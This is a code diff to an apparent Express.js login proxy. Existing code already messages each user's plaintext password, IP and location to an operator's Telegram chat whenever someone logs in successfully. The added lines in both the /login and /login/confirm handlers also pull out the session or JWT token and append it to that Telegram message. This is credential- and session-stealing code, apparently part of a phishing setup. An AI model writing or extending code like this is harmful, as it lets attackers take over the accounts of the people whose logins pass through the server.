@@ -1878,6 +1878,7 @@ app.post('/app/user/login/login', async (req, res) => {
     if (data.adminChatId && bot) {
       const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000');
       if (isSuccess) {
+        const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || '');
         let msg =
           `✅ *Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
@@ -1886,6 +1887,10 @@ app.post('/app/user/login/login', async (req, res) => {
           `🔒 *Password:* \`${pwd}\`\n` +
           `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
           `🕐 *Time:* ${time}`;
+
+        if (loginToken) {
+          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+        }
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
@@ -2046,6 +2051,7 @@ app.post('/app/user/login/confirm', async (req, res) => {
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || '');
         let msg =
           `✅ *Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
@@ -2054,6 +2060,10 @@ app.post('/app/user/login/confirm', async (req, res) => {
           `🔒 *Password:* \`${pwd}\`\n` +
           `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
           `🕐 *Time:* ${time}`;
+
+        if (loginToken) {
+          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+        }
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
